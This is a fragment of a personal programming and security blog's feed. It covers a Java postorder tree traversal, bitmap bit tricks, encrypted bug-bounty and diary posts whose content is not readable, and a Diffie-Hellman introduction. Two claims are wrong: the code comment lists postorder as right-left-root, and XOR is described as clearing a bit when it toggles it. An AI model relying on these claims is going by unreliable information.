<h2 id="Iterative-Postorder-Traversal"><a href="#Iterative-Postorder-Traversal" class="headerlink" title="Iterative Postorder Traversal"></a>Iterative Postorder Traversal</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//postorder traversal:-&gt; right, left, root</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span> || !stack.empty())&#123;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur=cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack.empty())&#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            <span class="keyword">if</span>(cur.right!=<span class="literal">null</span> &amp;&amp; prev!=cur.right)&#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur=cur.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.add(cur.val);</span><br><span class="line">                prev=cur;</span><br><span class="line">                cur=<span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Binary Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Bitmaps in Algorithms</title>
    <url>/2023/03/14/Bitmaps-in-Algorithms/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Bitwise operations is one of the bitmap representation methods.</p>
<p>Basically we have an integer <code>num</code>, we can use its <code>i-th</code> bit(counting from right to left, starting from 0) to represent the true/false value of <code>num[i]</code>.</p>
<span id="more"></span>

<ul>
<li>Set the i-th bit to 1(true), and leave other bits unchanged: <code>num|=(1&lt;&lt;i)</code><ul>
<li>left shift 1 by i bits, and perform OR operation with <code>num</code>.</li>
</ul>
</li>
<li>Set the i-th bit to 0(false), and leave other bits unchanged: <code>num &amp;= ~(1&lt;&lt;i)</code> or <code>(num ^=1&lt;&lt;i)</code><ul>
<li>take the complement(~) of 1 left shifted by i bits, and perform bitwise AND(&amp;) operation with <code>num</code>.</li>
</ul>
</li>
<li>Get <code>num[i]</code>: <code>(num &gt;&gt; i) &amp; 1</code><ul>
<li>extracts the i-th bit(counting from right to left)</li>
</ul>
</li>
</ul>
<h1 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h1><ul>
<li>Bitmap indexing</li>
<li>Bloom filters</li>
<li>Leetcode 698</li>
</ul>
]]></content>
      <tags>
        <tag>Bitmaps</tag>
      </tags>
  </entry>
  <entry>
    <title>Bug Bounty Learning - Journey from LFI to RCE</title>
    <url>/2022/06/12/Bug-Bounty-Learning-Journey-from-LFI-to-RCE/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b2f682c7c1423cb14cf4aca4c2f99e1ca7378733935d5f3421a00d8375abfc35">b60e26754db75fa005b995163af0d5a1ec8bbd33d365b1eadf7044f4ac4eb25e1f8d703834b10e832769189d33c4333e4a6c446b1a1b24c0a4a762e275c5b56303e7a6271428e9533bd5418f1e92716a8594277c6189e2c20a5bac9bf580e841c744478c42fb3e54f8c63c9a5a31b75692a38a8da8abe572bfec09842aa3c2cb4a6cf86c983afd2c9a9484060dca82af904af7fa83a4d6b633a3da8f53e04b40991654921349ebbe9401c90612b4697c80bfecbfee0c5456441201278d82fda2eb5c646eb70e80adf37345a3665578726739ee234e114c3e73641b2cd2e449ed035facd0cda614247cbac9d8a3b346895d121302c4de63eb2f7a8b761683511d9daf2fc2970bb348771f0ed7f7aaf81b796a2fd9d993bb53cee526fc0fbe513d810427ef71b584fc1e0818c9a9baac19e3112385cb996c40eca2827e5a0195707acdd1edf121eadb5f624a089d7c12d3d3c93f048839d4c1069de885fc95784f3bdc9095b5ac48dd0e226e0315ccec5507b49f8f37d9c6c7a78a082059dda1c1d4ca79e51f7890f321b63724664b791f0e0bc1704348a2cbe7e0048c6f1be0e467a294b374e83815ae4185a08413d2cb49d399b7fd6c193007739257a757078fc4df8bef5a9cd33c3e1f80a8b817783adc272cedc89e3c1c740b53b2d35a077e6a39047fbb09a67253dd2111f63f28a895f0fa6dff12fd0981cd35a5635c7b6747264c39137f2e0b3733fffb4f6b30d2ed0612af625db95f10bcf433f31cc4b94675b826bfef3909e824cc736a163b5af3e5381e14b9209ff77eb625c623cb085e862e72767341e5bc8ad801df0db88ea74f3bd3dba716fe7821e9ad9768cfd37ba4018da26080b73adf9e46cc16b48be29c5fd8ffb0fd36cd5c5d15ec451712fc78db4b7aa413aeecf87c9604655ce3687d5e916ee56c50e5fcaced78421480692ff9607428dce45c382c4bc597de8736a02407ecec842f0da8d8c9a9239f8113c12046f53a04f7f15dfd3c3fc00ff65ae2a9afcc8c0724dff5a86e1408ae8f01adaf1470a54369c5d448bf9705fa66dfc221820245634de0844d153dc6946225e03e191c84805a2da17d6121a69d8815af59a41fa7a4bda4c5a30c2657ebf4512211fd1e446ab6b1c1fadb5683a01948556276c2b7bf3676602772c396c2f70486384585830dcb20c831d4fbdcc2092008ac23dc8c98e42a70f8a5c19e05e0ad9498c8cdc6ac213f309580823664d799f02c84d5ae0d8c85a0ea46c5b3ebfca25fce56b197dd18027f55e8a38e39bd3e50e0f53c5f13a6c9f6e65f8b449823a01a086f5ab89a4df4deafb24e4289bc7e4956c60041b6bcf4f3bcba639df0b3042c6c96454b0811111ad8b4aef771f58a860d49e4dca2037df79c1cae6d1cee1b02cfddec4ee6590df135ffb64ec2defa198711c5f034e3803cbea6ce90619f2eff612431f191fa765b6ab1009676e86004a364998308325ab2341e122fa8291411c6e29d246857c72f1173b2d8c6e3401dc9f8c5c0ebc19869b40c2642754c003f7b9620f3c7d016a5dcd46983a4030679b9534f41e435dc4cf368ff8b2484656ac9144639abc658b93923d846613a47b40f7329facec384357493f520ad88609d4b637186e5105db054f4fcce9ab5af8f3e6146e6b6fb45be35d3b460821b4aaa321aa5c57ef883eec845427f72918b5415cdc2b39274d1ff7ec55b8a2db2a2c43b231276de75d1f2b7ac0085f33244d03149c817cb885f394cefbb7cca3b86feb0ee52c0b7fe9c60f617238802c3b65b7c41dad8d1e4843410bca0750bbf12ddfb33a3e010b0531a0ecb972f1af6c46b483b5da715f9ecd7198705e487f7cfd70ba7b31836c7b21410a6f85ec3a25737e24fc66788d661ac0bce0fc6bb22f2cf9ebefaf771c5847a1f6a5b4ec00c487e25c512b7e6e1644c4f147d11112ae3538ebee33475a24a5b3b5ce492a82da993ec9949d9b57a624eb7f61b24d765a01dcc0a7f5ff6798d192bb876180db6ec5c758bd4f7676d443245583ae797fb2d15cc7ceadaa94ef22bc8e712892863b3c36065f434adf6d242aa8483b0ef030c522f840a831731d3240a9fb245808cbb07863e7c8e675912230f782bf28e7e6b096576c8319110c570b17fafb1a1f7d6690f39be1b88e097903a9d033c5c9c6e6cf10cd2859a8b5be458f0f2103040f78a59b23bb3b30f2dd6a3eca90a88b56248765339604a41314fcc736cc59177ce147c146bd7767ebca3ee7e47e038813acaa2afb55f0a45cd9ccd7c528eed4df008a6cf82d117efb2c11d5b127a6d5743ebe58a1bb4fb7e7f47cf80b8144da10382cad2120f75cd91213b4e0536b51f84396188d55ed26befe27e4e209188a901f3612220cece917f33f08e849861b83a8deb8558dbd5b1c4e719ca922e554e11b2c7ffe669e56f57a2440462b6826370285673301cfc6c3d75464f58d900420deb1703fbd455a82fef1e91695874754497f8263b6fdd31ba0f3794c1577f8a32243f15f8ee9693de80b7591b5a63a5f01711f2edb0afbfe46ce3efc8800f61c93694852ba8028db3aa18ed93870b292c0c0feb94ad187dc9499fa5f977abe0c437099b5f19ae47b08f7d30e19f44bc9036390a1fec5cee2b1e487a8f6276591afbe9926e1e6445925a0dd78b4f1c31c144efc319550c95b9d00cf3fa13b80aa901894aaf19d672f21cca3b25db4b60321bee26a6706a1c76536c6ef7924f9cccd5226cd79fbc7298c0ea2fc879350da0abe09e890a1cdff9ca88712a8e1bda9e43a758ab9914e888ebc2841852dad2eb1c97b4ab3464b65bdb371ac413dc7191374a88c8471e660a93db45492b011e7cff4dea5ec6cbf9064c877867b684d09079c558dee92fd422b1a08aac1f43f7e5bea4beec726d093885baa1ac1d8b205675cdce0452a1a977598ba974d1d139b77d9451f3677b4321466ec3f943da857912ac2ad8a367c0435131a898e14f31b7be51c7d38f2c31bf0f75af01890366</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web Security</category>
        <category>Bug Bounty</category>
      </categories>
      <tags>
        <tag>Bug bounty learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Bug Bounty Learning - Edit target website&#39;s aws file</title>
    <url>/2022/06/11/Bug-Bounty-Learning-Edit-target-website&#39;s-aws-file/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4e476d4bc287b00fdf1d86c8c366d3b2e1dae53eba1798c03abdab3e08a1a1d8">b60e26754db75fa005b995163af0d5a1ec8bbd33d365b1eadf7044f4ac4eb25e1f8d703834b10e832769189d33c4333e4a6c446b1a1b24c0a4a762e275c5b56303e7a6271428e9533bd5418f1e92716a8594277c6189e2c20a5bac9bf580e8415059f684ed2cbe2bd2cbbce017c8a5e5430d4af22650c4092ebfe41f3bb23bfe70d0da9df65750060d397cc99dd31e081f6d2a735086cafb75cbb4132509a58372bd042ccd4903c73eef049afd095125f6ca8e14ad1589c22cce4910cd640c00d8d4835b3ea37316a441cc884b6226a80e487de42b2488c3cd17e83e6375c7f0636fda760bb08742d64eaaa8a10d913ca3949268b41a758c4caf30b4eebfdab259a9485c7cb22e7158a9fa6a2ce5525ae3ce4af97cd4fa4694343c7c5afeef2369c434f985bf6cac6a25a9dec923f50779b9b701596b921fdb592206b311b05260144e5be2b4829d1a063b0ae792d18444f47e22c692876611fc24d7624b93b2b9fb643bea04ee0c77035744660ac8243104337cee291afa7f1e08c9a28e95d5ad5ba7712699575efce3b020fa4429bc8b54aa9547af3baebc15b6646b3d8d992f5b863a90619622d60d87b47d1d9c505c7f2bbd5170dcbf2691e64f8d8c074fd3cd7a0595d22d9fc0ffbc9eef2d2f77126848703ac3c78e6a788b36cf452ad95ad38347fd337dccfb974512511c1c0ad9839eedbbc592f97880aba594e2c1cc53493835659ba21172cd5930bbec0ce40a89185227f862916a7f79ed2ba119ff18971a1e886a9f8fa76d4e252e9cf399cbd5b0aa58f7b00e7a0142e0d38002e513d9295eb52664d6ea773fdcba592cb600207b79bbbc0dbac33a7cfbd40311c208d51d68a729605d164a9a5de87095cb20678b2f5a4ac2e508e72343b4b92bcfef63a0e942faaabde302d0d91bda99c6a6b3bc59f4de39fa63105a8608e8c4c7f1905752b935da5d9c0a8aaddd0b13e855008e6b976c6fec1a392468539a3b7e300a87203fabcc391f2b67d56649ae872366df0494fa1b5d3fead936008c09f51aad9856833fb181bd3430efd7719221dd8255938e2fdb500a74707f972fd51feec23d0d94df6ff14fa9b56f1c97a81b4148d929972bce9f2e0e9aa984348c01362aa065d22beff9fec8acd1983e2e37a0824a219a1da8831aea7aec56fef6dcb4707caff59e694f94b55cf44cf1e21c73e6e893bea70d69737b6d5a0078afe572ff3315741fdec0b9940cbf309ea4ea9b498814052c46cf93da97e13135f4dbc63e757e8913f519bf195c897b1bdfd1e0fbe99d7ef5a30e33418d07ffa941f2634c96fdf6f1291c3f03cc8b22958253af48ad536654cf1c80f3440a8d71810ce38b13f8abb063df9ba60523ee2744e67f6e2de304c8ba0304be2583449aceac3564f76813c9b7ef84bb31e7d79a63a8ea933875c23b1f10d6b56e4ead16cf680a114809e60ed5f74da649e23310799865942ab2b8eb7a0c17791b6784f2581a0df85bd05e23504c51bf23390417a4a018deab734b40688d073c1f29bf61ab6acd359b6d0655f2ba3c508cf37614ccc2833c53a3a78b5caa52a3ed6f64caee02d5cb61fb80b5570eaeee6f804e446bc53083f129ee6fedb3c40e44d931603b38f090b30aa776473ba1a6f3e15d0638b591d9ff60b7074eb0002a4e6db50e54b77d360c65cff8d013ea72a06e28ab988e126a33106fc3a733cf2fe05ba7ee71c1b7d506d33c2c94998090e9d431babc7ffcda403baee8531452d22e83cce8af6c74e760d8086fd9990fe88b440328ff6f833cf8176921bc834fdaaf9622ecc015fea7576545d0f995b12b46add721572ffc208e15807a1b687bcf95e3c6c2f342d19d379cc1d34c2d0a66ecf29faeede03b0697053ab70346643fc0e39d5e1949467228845e5f41fe226864434fe04e9daa1d8ea61a9cd59531700712e4542ee4c521ab168ec12f946f67cce4d6fc4a1556712553a255b4057b270ee5756c3b91a7f37f28e216b2a0a67a91ea02c38a6199b43ce5797ec784c5b790960ddcede89d0cb0e82e609fbf4fcb7ad8e0798059772c5495a7f022dbc57709b3677bd88af1c1f01e72345f2cef01acbc1cf79824fa30fbed09e12c2aa534fd27f8497d79336d08d4d24151005a71ee8fa4e0c4bf730c048f6b33bee0c8e31cdb5081ca3b619404e3865a539809b2220b94c55bde4e9083785db54ed15946cef787954a071c9123b62126a39cb00fba75886502ec372b3719d695ad61e245031970f17e3c08d9254bf946b0bd6249163d90dfbb842a90d7153cae9d86ccb8886e1ca8f4d06d3e78624f20591901f7f053074e5dc816e0c2abeed4ea494fedfbc0ad6d384ae92ce6399bf33f5438b9fbc449bd983966cb894f9b337803a0a78e744ab663b9b9fb5f9a14e767f64fb82c91bd777cf4f6a9f723a49a1d416726d7caefaf12659fc2555fa7dd31e6c40eaa15fa00ae6100c32a2ea25ed1cf24383f0991aa04f5a10d21a0fb0be75d334558b47ebee31d03ba26796e052e772d3e9736b30d5f011321b0fd761aeaa1bf8effed46f8fe9ff3a61c6ac499afc76aabfa022ff3dc645e51b5361ae8bf755d7c1885a63817bef723d2ca4314b5ed85337f93d05c76fa7d47b0d94bcdd7cea085fc104635e1766f563eb893f1cd52167532330a731ba77ce2c949d4da5dbddd45393fca3666820bd186f6875b51ba0cd953eed12f7ee4c5b0a83855942bb76911d88787300c2c2dc6a4c199c9dac1aaa59f45ef5c891afa06af8ad760ce5080bebd35ff83833d03a037cd78257db38bdfddf5558e368a94d11f338f66552a4600f7e8905770065e054129173b8b24223448679aa188bcf0e09085283772c73a5765dd9ceccd152097bb1482cd187bd1670b01f77d65e9734711e09588f869eb685c94a0845dacb005341b340518ad56ba1d8fd6ddc7469f0721bfc5f14b013158191aa8482def63e6d397991590ef2793f4386c78ee9403c2358e6248fc1a9cf5d8339e0f73991e8fd1e6e35f40d41b9a0602fa88b133f83c287fdda0c59b66eb01f58d604ccc01e254a5c763f6974057386706aa12a03ee772fcf47ee204d5aa2ad9d15c700bbbc6b6698bb4870b0a984d8782076b6c89035001f8daeac280684b95ae0da2e1b631d004038d80bd9246e493439de19ec83e679d6871ca0aa2f8b4966a0a125129220f6a88c6001197baa670f278e4f4a916d4152dc1a5181a57a27ed8d6dc04e832c19407f1ab8406b37630015e9823f32e28f1c407221625d29a16498a6a6cd64a5442b6b0f3f61e88ef909e0e7a738ab6bb56176a3d6f7031a7f74cd9c6c7ca0a42ebd2099b7478a45c357d0d4abe967b9a709df5b3eadbe417c72b2617098d008e6a5a59fe12a40602474313efcc54591ed6472046394927cc05d176338a0e368dd59444312711d3ff366daecf9a98bb754ce082e48bd272bf7dce80be5b9d696fb67e564325b9bbbe26364cdf1a45347bff56e7687a244d834356ee5ce950c2e27ecbaec619fb16a3bde46e1d182dac5e0b8f76058f90e2ce252050e76da265d38c3a40b6b9687386ba31291cc2d103ba8b5124dfcd79568396797358ee9b59c33642f09400d8e9cd719d86056a4f7c66097afa99088043eba51f522b61c90f7413032aa109dfea6510d7b77f6df42c6d5666295c611e3ec87c2355192e0105d5c6fa5521d0fc8d6f88a3447e545bf4eb1106baca7de5aa92474e8b8c97dc5d1e0039d1d802773afad78c5dd46c111cb4bdfe082eac644aabc4da80abc2770f2986a28521332bc2f0998ba65cbcc40f06ef933bba4d7bb3853b3217dc9d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web Security</category>
        <category>Bug Bounty</category>
      </categories>
      <tags>
        <tag>Bug bounty learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Diary</title>
    <url>/2022/01/25/Diary/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="53f61cd5558649269d5d22634418c03fb75d35003169963e50b08a0085275cfa">866b8dd8da3390e86230366caa1004f73133dadcf86269f3a034cb8f0c775a6ace23dfe8cffbe2d19ab553c815ed16cb917dbccf04c6a0d8fcf711e570c7abb7e68aabd30a6c8e7fbc426ebb1c0432302e97234bafd16f6707063ba171c9c3ef7e4920e5fbfd9a9169dcddf21c4f0c5652ed47c1da0d62d90e2671eaa031c9faf6ce4a868604be38d46141c14f6d2e951e6879c69a6ef9df260673c522af9e864a31c651d539c3bd145847a077c17771b9775f67bb49c39af797a04bdf225a8703d9e7b71b3b55fc4ffa742bf71a7b830fbf7e0b6761f2801e265efc212586fcfeb75cb4854e4b4d1cfba80bfa5e3b7a05fb7ff632a7b666d96a09b41557303a84c6ca37fc550acc759341e39409cf21fabb28aede2d0f3a9019ff4d736b10f8a862e6020e07f6d7d87e4e4d29e2d57d48deecf819159fce02610613f50688ef3fde0df8460f8a1350ada34f791dff47734e2a35ca03e182150055aa54f60744f2f94e22e5e5a5189aec304a9db93aa542a1584b56e0e0f94e4090679d4870df59912b723e7bf6ab194827e04683e877842e9313e0109a63ae59cbc056ec0917d68a859a3e77f067f2e2a1844364a82d6444503eb4a139c2b9a16f1eef17eaad0d43d0f4296c6357779e3176d8b05e1df04755b7d1c3ea8dbcd7187334d24ccd3126103b67535011415b6190e2da9497420206eb511ede812147b34a92ef1e10046e8b8764785172d98c1217e6840cd508b81eb436d1124503197772462918e4bd9141fe33e9d1ae7924eea95dad3f72aaf322909ff1095632cd6c0d0f057e0b2c546e34f1e8571a7d5b4b96c367c94209de68adaf5948ca8ba61e7af8711e6bb75fcd523aa77a8179d833a8bae411606db8792603df5bdd6144f6abc62110c0c0541818eac1203110472449738066af4e8b83db91272571b9bbf8f52a9532469c021af99c5749f4a462f68a5fbb07cbefa0cddfff83f384e20680a3b7b6ee9951af3da7bbd6b8ed669f3b594d4ec77b2d14dde736749da4dd44a9e89e4d03aeb58bad2e34e940ea70b23a0348cd66d2da8241b07a722685804272453d97a46209652fdb3a1635433bc57edb4c89f1467b8e4dd2b08c29115da460f2af026f7a0a1d7bd1e865f9f00d303f72022af55f0f772469daf8af6acef4cf46eb060b95e5ca712e8a60e04b1baefcc38124c6033b3025454c392b52b4f421f43a3a269f07f2a067b860df56f1450c16cfad4ecc64d3df376424305a1f7665606672b3f4bfb20e96b5b754949de79b9156355bc4f514e03e6f55b53d7c5a32a295df220108e04c4e8b03d1935b2b79c606c91c14f01eb11463cbba9ccd5af19ee7b5a2c313b9c874052b4e2dac16e84462f15c49539bd172c2a6967f93c2735a2561fc0b0bd6e61efcd4188c4b35b228b237701258f2fbdfa102e3c07ae9d77dd114c10eee320ebf6bc9c3de9fb7869c74088ce5e66e3708e3b5990958664fd0d8a1cdd762d4c374d034a175af2cdb77f8e3b011660fc6aca74feaf9ffee6e8a04285cbf6ebd1b4b009f642998afe59d9411c9aeb37a68580b450bc4ee8692e6ceae0083232c3144f7a2e1a336532406c1486ffe1d0426a3d14f63d1c4ed28c6e2fcb594c3e59bdcc6677446bf17d033e6effa7bfcc754664d9d958744c13c1a471e8d53290e9863943511919ffe4a70814bfc9a83ae0bba7ce5e911d5218ba068fefe0fc85ff77e297b8262dca32f4e38c6bb2cc0ef4fd0f7d0991924e182560b26270e71c8cc753da822762fb7c0f71679ed00b45cab5d71becf7dbf08d0b58e5c651f20ed134362d2d0a1e4a22edb65c8a7fe139abd52ea2cc15666c94ef1f253387a4aeb7d9397d2c396d15a7bc453c83cdd1ab3b8372c1ae0605d65206c5b9a9f231fc464896458195b260cb079df03b334f6556d272b7f45392d3a0ad9ef14192967779ad6ed710dd78a9954f193661103966af4b7080db72075969052cd84fedf4a6feec7bce755477ba42a9ae5c278d4ac67a6d66a0ab8a890a78013f875ff00444f21e31b6521174cd930fd4b9dcdb6193621dbbae5735b2dab256e526b25339e5c57ba7407008d178770d5fce72edc2893ccd4b857a3029042214e724b965eb1800f07ad114d6984dc52e334346ad74bf2e551435de6f9d3660ace7235b15115e3d2838ae0982261210cec0eccb95f19b1e6c03cf699325ad8f8d73f211bb306a64f1c420f2549fc32f472ceb656065a38c2524470a4a28c3e0d46e26bbacc285799bc6736eb8d7d82767396061daccd7636da72fc352c17977268994489be3d28bbab52e82af94ddc6e1f11cdf649cca72ba213c1dc23be22105589016b58c512e1c694a36574db6dd898c66c9c533349d6829380a6c479ec7a73c58719003077b56bff2bb2746398bca4a6914bf6db9215205744914e92c61e5bd19166bb5b048264a5fe8fc0c1fff15bd81a8a86914e4ab923a591d02806c05f8171247d0592c457f423be7c5a1459da01e7a9c073669602acfcc1f87bbab8f8c4745596b56afd97ccdbdaee66337d0223b6499a024e2f729d032e8113076bcece35bb35982cad67a894afbec9b9d2905fe928b6c39f2e8a4a994d5b37bb095fc7ec94650581b47b503dacffafd1090b421e134fc928aa1eed59df8dcc3345464d0cb6eb632ef7671be494f0f5b042cc8c50e38663c55013f9b501575fa918c7af4b7fbf7bbb37171d279a2742ce7278a232abe46d111622516614a27176e588a145d17c1eaff72b20779e7d9fe13bc9fd55b9d82128d4377a0aadb2378961f39980f9f755ed0662aeeb30585eb0d5c6ec83b7f1d2bd1e63113cba40e62012ef3629fbb0b53ebf2d7060cef8ce6655d009a6a98599271f5c89739a9a99cbf9df2db899ae38f20f2ac1af7164a5360cf559a8bdc24c6ddec2eea970718a107e59e1e39c9bb323c09ce686cef7542a42d445ca0587d84e11b48104e3593c300da3c1a5f0d30f95735d7ecfa1b980027b8f7ed57a5b1f861f0cf9d69971c1c6486f5ac7762c94bc3cfa556c8c195a084b7ab5a0c8d71194a557b85401dc589377d4844a452dd5dfbfb0f257306c5f7b37ad3b12a7f78cef24f760e45ebe80b360422e4c4aac9b4e1807695f7ca385e5efbb8cf2038ccc602d8ec391c10b9217114b36aa95b39d0122ae0601581603a4d8fd653dc3f67951c7420b8e3d2d8e027a66c927e86672ad3e7670feb091aa22043c49e282fc4e79a33a9134a23569fec3e68ca4fd2f8eb67867ed76819c05fedeaf00a12b99ab607c14d5a008ab43a7237de0ab0e87b4df1d788f52d0687e3744b24fe5d125442ea251734ee595f7935175d2e7856ddbdfb0bcf74045d55e018b249dc6fa321c9505b831e27fd82632da51508fbd8064e75402a85e98c66a910ac7042bf47839401b16c83708bb83cf581880289d5fd0d2414b0f3b10607da3c30020a0b714c48de17f4a1413b264e0fc6df8c66378631fe78a133258f0472e604ac7398bf8ddd8f75d26b5552e926793fbcf8d788595c43906d2b196f4fdee1f8d2d5fae0896cf8325e95b8bb5371fab1fed7fafb28f697b3e73e7b7f477d07ea0c9245a1987b133391b0c15c36c05c774ff107755bf91d78fe6343e0b725e123cea772f2d3d18aa39a4761f4e212c9d71ac448dc30bd75aa470ec28ac6e601b027b39aadbd5d2fb6f2dcb938d540992a9c2a184cf74a3d301153d8f35bf7c5fb1e950b344b1632daaaadcfec31c18ebb428e870ab616fe73523c7b4667d8fbe58ea3f8803a610792ecc066c1b119a8906217a9d566481aa38962e2cc11a3b66987c95770db049651f188a8971fd4e0024cfc649f75356fc184b024e404cabdcdc81d845c00f00689c6080dfb4097554d29fa7d4139e802df374b1fdd8830a64d800f8ee53d98f1c4c89a94598d8b33f134b2812d23f5e1d41d7b8bc7010727a2f6f793934c20c99b26125385a06b105854ad646be1843daf6305f8063aa5dadd11f1f36750b91bc528a6243a90d5e58537c56f43bf26611feb4e4ae46e078afbd9c92146086fef2e182f5e2f93922ec3e5047037b3167f1cb4a1091a9de144f8fcfdfbda1f1635da60d3ebf9b1724b29a6adf048105de9e87c80b69a63b879707e89e5edad79f5a1a8d4af98bd49e9c7421c115d430c86d6ae73632ac8ed779d9b494326e09441bed9b5f2153247994b721f0fbbc83fc87fe9a25baba224b568cae35d68714f917eba2b5c518b33044d412d3e966226993b16e6591431be489124f3a50b6d27c26eb8dfa22564adb231faad47fd71ff71ac16278df47a49b9f3e09a94511059dc2bd6d2ed2fd1c7fac2ef579282b38451b0b83b41f16053fb9f09b7c96b67003217a13272f1c8b9d4533d3ff530c29aaf2d797f348e018abc1860f374b41dad3c909daa2c41e1447c0fd1be7c01619cc6cd6fcf4580791cc191aec09f89ca974bafb64745c871d001cb55aeb24618ffa58374ee30d73f87373545e7c7ccd1b1f0971d15cd8390b4c46a38ad9050436111d2bf9894d81e598d5e002c0afbc66121941e28d8e7ae1ad576d61a7eb873a1972d00c453d91c5530f9bf77433672bb6e53b43da3cc6926e455ff34a7274d8501071c797d6820417ec31174a7cb249d0bbc51423b1c227192743d75c32a2a63408142563d8f43848dab7f88a0867f661d764bace343a6db3308e02ceea9d083ea04b9b2d324df8ac88d88f58b6904fc29ebddb0d997d0a1585a948810551bdce2d26143f46bf16c55f62c9161be4bd2d22642cd28028f96dc8a4d73b3facfa31aaca33f12bacc0b8339928d73cd4a7a31a9e078ddc48fa304ecb4e0e1f6fce02a299cd8748fa9d930fe829b362d52ba74ab6129db558e7b9995592f7ade609f8baed2c0a014509783d2a088c61618e64e991d3ec1561e9e57906c72f2f45b13a4ea382f02a730f5ec1fbf94264a497d268786c5ad2c6e909986b2bb858444cf386c2665a0f2829875aba4f97753b959bae04877e478201b4745f9cf315e277b73cbbfe839415f1d0b9bedf93cafc54922b4678564f78fdea2ba99aa1baec5baa872909221386fdf99d7d89ae08ef0c267717c74e7e2853c53375afdb8d65d041b5e7c3c060ee02ba00c13505b183fea50d9e41d301b1e486396de015fb8a214da75a27dc3fe427a8f5ebcdd1d2c75d283f91bfdc77590cdfb889de2599d1b98c6d8bf7b211ae8f5d46d5976949f6e7a15c907b0a4af7e376fe8975c08aa1c1fc5e6007b41d8b1d1d250d4ac858fa43ab56e35fb560dac33f8ef889fc3da8153f67e67eb9d968754814c80088540a51694dfc3320b59a9ec29c9b7953f9899881420e3d61effbd84a239085a7069187d6aeb9e52dfe3ae1b789fa52e6b4a2097fdf75b6e0c1fddf465eb1ce995d0189355e34c1e033d3f838b16f32fe7c8319dc3b98b8134a374ce46e69dd854c7bea2d5b01ab0375596326f527bb395eb4e5a4461f9ca05ffa630ebfd18a5e0403ef2bef89c54e3f2b546e5810eadb20361b031cf6573725a447bb9bb62a47feb511055b69b769dbef681b091ebef0ab412211467fbf4d7cd477a597b2566cdd8c5c62194357d74e1ec1f8ea1d8a1781c07c4650dec2d36234ee4b004449621b296abcdb00d7f60586809e588476a13de5</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Diary</tag>
      </tags>
  </entry>
  <entry>
    <title>Diffie-Hellman key exchange and EL Gamal PKE</title>
    <url>/2022/04/04/Diffie-Hellman-key-exchange-EL-Gamal-PKE/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>Diffie-hellman key exchange</strong> is a crypto that is widely used. You can see it everywhere:</p>
<ul>
<li>SSL/TLS: web</li>
<li>IPsec: IPpackets</li>
<li>Bluetooth</li>
<li>5G</li>
<li>IOT</li>
</ul>
